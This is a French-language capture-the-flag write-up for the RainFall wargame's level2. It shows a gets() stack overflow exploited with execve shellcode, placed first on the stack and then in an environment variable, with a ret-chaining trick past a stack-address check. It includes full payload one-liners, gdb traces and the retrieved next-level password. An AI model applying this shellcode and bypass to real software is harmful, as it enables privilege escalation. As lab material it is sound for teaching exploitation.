@@ -1,0 +1,215 @@
+approche shellcode:
+
+lire l'approche env avant pour la theorie
+
+level2@RainFall:~$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7a4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                             = 0
+gets(0xbffff6ac, 0, 0, 0xb7e5ec73, 0x80482b5ok
+)                  = 0xbffff6ac
+puts("ok"ok
+)                                                     = 3
+strdup("ok")                                                   = 0x0804a008
++++ exited (status 8) +++
+
+level2@RainFall:~$ python -c 'print("\x90" * 20 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 24 + "\x3e\x85\x04\x08" * 4 + "\xac\xf6\xff\xbf")' > /tmp/stack3
+
+level2@RainFall:~$ xxd /tmp/stack3
+0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
+0000010: 9090 9090 31c0 9950 682f 2f73 6868 2f62  ....1..Ph//shh/b
+0000020: 696e 89e3 5053 89e1 b00b cd80 6161 6161  in..PS......aaaa
+0000030: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000040: 6161 6161 3e85 0408 3e85 0408 3e85 0408  aaaa>...>...>...
+0000050: 3e85 0408 acf6 ffbf 0a                   >........
+
+level2@RainFall:~$ cat /tmp/stack3 - | ./level2
+��������������������1��Ph//shh/bin��PS��
+                                         ̀aaaaaaaaaaaaaaaaaaaa>>>>>����
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
+approche env:
+
+Ici un buffer overflow est encore possible avec l'utilisation de gets mais une protection se trouve dans le code qui amene a l'arret du programme si l'adresse de retour se trouve dans la stack (commencant par 0xb
+
+level2@RainFall:~$ python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 15 + "\x90\xf6\xff\xbf" * 4)' > /tmp/shell2
+
+level2@RainFall:~$ xxd /tmp/shell2
+0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
+0000010: 9090 9090 9090 9090 9090 9090 9090 31c0  ..............1.
+0000020: 5068 2f2f 7368 682f 6269 6e89 e350 5389  Ph//shh/bin..PS.
+0000030: e1b0 0bcd 8061 6161 6161 6161 6161 6161  .....aaaaaaaaaaa
+0000040: 6161 6161 90f6 ffbf 90f6 ffbf 90f6 ffbf  aaaa............
+0000050: 90f6 ffbf 0a
+
+(gdb) ni
+0x080484f5 in p ()
+1: x/5i $pc
+	...
+   0x80484fb <p+39>:	and    eax,0xb0000000
+   0x8048500 <p+44>:	cmp    eax,0xb0000000
+   0x8048505 <p+49>:	jne    0x8048527 <p+83>
+
+(gdb)
+0x08048516 in p ()
+1: x/5i $pc
+=> 0x8048516 <p+66>:	call   0x80483a0 <printf@plt>
+   0x804851b <p+71>:	mov    DWORD PTR [esp],0x1
+   0x8048522 <p+78>:	call   0x80483d0 <_exit@plt>
+   ...
+(gdb)
+(0xbffff690)
+
+Placer le shellcode dans env n'est pas possible aussi car les adresse ou sont stocke ces informations se trouve a 0xb+
+
+(gdb) x/100s *environ
+0xbffff4bf:	 "TERM=xterm-256color"
+0xbffff4d3:	 "SHELL=/bin/bash"
+0xbffff4e3:	 "SSH_CLIENT=192.168.1.71 54516 4242"
+0xbffff506:	 "exploit2=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
+
+Ainsi que l'adresse des fonctions de la libc (pour une utilisation de ret2libc)
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+
+Nous allons donc passer a travers cette protection a l'aide de l'appel ret de la fonction p qui saute a l'adresse la plus haute de la stack en decrementant sa position de 4 pour passer a la prochaine adresse stocke qui elle n'est pas verifier par le programme.
+
+Pour le code a executer apres avoir sauter a l'adresse voulu, nous allons utiliser l'adresse de notre shellcode stocke dans env.
+
+
+level2@RainFall:~$ export SHELLCODE=$(python -c 'print("\x90" * 20 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+level2@RainFall:~$ echo $SHELLCODE
+��������������������1��Ph//shh/bin��PS��
+                                         ̀
+
+Il faut maintenant recuperer l'adresse de ce code (plus facilement grace au nopsled)
+
+(gdb) x/32i *environ
+   0xbffff890:	push   %ebx
+   0xbffff891:	dec    %eax
+   0xbffff892:	inc    %ebp
+   0xbffff893:	dec    %esp
+   0xbffff894:	dec    %esp
+   0xbffff895:	inc    %ebx
+   0xbffff896:	dec    %edi
+   0xbffff897:	inc    %esp
+   0xbffff898:	inc    %ebp
+   0xbffff899:	cmp    $0x90909090,%eax
+   0xbffff89e:	nop
+   0xbffff89f:	nop
+   0xbffff8a0:	nop
+   0xbffff8a1:	nop
+   0xbffff8a2:	nop
+   0xbffff8a3:	nop
+   0xbffff8a4:	nop
+   0xbffff8a5:	nop
+   0xbffff8a6:	nop
+   0xbffff8a7:	nop
+   0xbffff8a8:	nop
+   0xbffff8a9:	nop
+   0xbffff8aa:	nop
+   0xbffff8ab:	nop
+   0xbffff8ac:	nop
+   0xbffff8ad:	nop
+   0xbffff8ae:	xor    %eax,%eax
+   0xbffff8b0:	cltd
+   0xbffff8b1:	push   %eax
+   0xbffff8b2:	push   $0x68732f2f
+   0xbffff8b7:	push   $0x6e69622f
+
+Et l'installer dans notre input
+
+level2@RainFall:~$ python -c 'print("a" * 68 + "\x3e\x85\x04\x08" * 4 + "\xa4\xf8\xff\xbf")' > /tmp/getenv
+
+level2@RainFall:~$ xxd /tmp/getenv
+0000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000030: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+0000040: 6161 6161 3e85 0408 3e85 0408 3e85 0408  aaaa>...>...>...
+0000050: 3e85 0408 a4f8 ffbf 0a                   >........
+
+La memoire apres gets
+
+(gdb) x/48x $esp
+0xbffff630:	0xbffff64c	0x00000000	0x00000000	0xb7e5ec73
+0xbffff640:	0x080482b5	0x00000000	0x00c30000	0x61616161
+0xbffff650:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff660:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff670:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff680:	0x61616161	0x61616161	0x61616161	0x61616161
+0xbffff690:	0x0804853e	0x0804853e	0x0804853e	0x0804853e
+0xbffff6a0:	0xbffff8a4	0x00000000	0x00000000	0xb7e454d3
+0xbffff6b0:	0x00000002	0xbffff744	0xbffff750	0xb7fdc858
+0xbffff6c0:	0x00000000	0xbffff71c	0xbffff750	0x00000000
+0xbffff6d0:	0x08048260	0xb7fd0ff4	0x00000000	0x00000000
+0xbffff6e0:	0x00000000	0x20bcd60c	0x17f8921c	0x00000000
+
+Nous avons bien remplacer l'adresse de retour de la fonction par elle meme qui va se deplacer sur la stack pour ensuite aller sur celle de notre variable dans l'environnement 0xbffff8a4 et executer le shellcode
+
+(gdb)
+0x0804853d in p ()
+1: x/5i $pc
+=> 0x804853d <p+105>:	leave
+   0x804853e <p+106>:	ret
+   0x804853f <main>:	push   ebp
+   0x8048540 <main+1>:	mov    ebp,esp
+   0x8048542 <main+3>:	and    esp,0xfffffff0
+(gdb)
+0x0804853e in p ()
+1: x/5i $pc
+=> 0x804853e <p+106>:	ret
+   0x804853f <main>:	push   ebp
+   0x8048540 <main+1>:	mov    ebp,esp
+   0x8048542 <main+3>:	and    esp,0xfffffff0
+   0x8048545 <main+6>:	call   0x80484d4 <p>
+(gdb)
+0x0804853e in p ()
+1: x/5i $pc
+=> 0x804853e <p+106>:	ret
+   0x804853f <main>:	push   ebp
+   0x8048540 <main+1>:	mov    ebp,esp
+   0x8048542 <main+3>:	and    esp,0xfffffff0
+   0x8048545 <main+6>:	call   0x80484d4 <p>
+(gdb)
+0xbffff8a4 in ?? ()
+1: x/5i $pc
+=> 0xbffff8a4:	nop
+   0xbffff8a5:	nop
+   0xbffff8a6:	nop
+   0xbffff8a7:	nop
+   0xbffff8a8:	nop
+   ...
+      0xbffff8ad:	nop
+   0xbffff8ae:	xor    eax,eax
+   0xbffff8b0:	cdq
+   0xbffff8b1:	push   eax
+   ...
+
+(gdb)
+0xbffff8c4 in ?? ()
+1: x/5i $pc
+=> 0xbffff8c4:	int    0x80
+   0xbffff8c6:	add    BYTE PTR [ebx+0x48],dl
+   0xbffff8c9:	inc    ebp
+   0xbffff8ca:	dec    esp
+   0xbffff8cb:	dec    esp
+(gdb)
+process 3930 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: Function "main" not defined.
+[Inferior 1 (process 3930) exited normally]
+
+level2@RainFall:~$ cat /tmp/getenv /dev/stdin | ./level2
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>>>>>����
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+level2@RainFall:~$ su level3
+Password:
+Done.
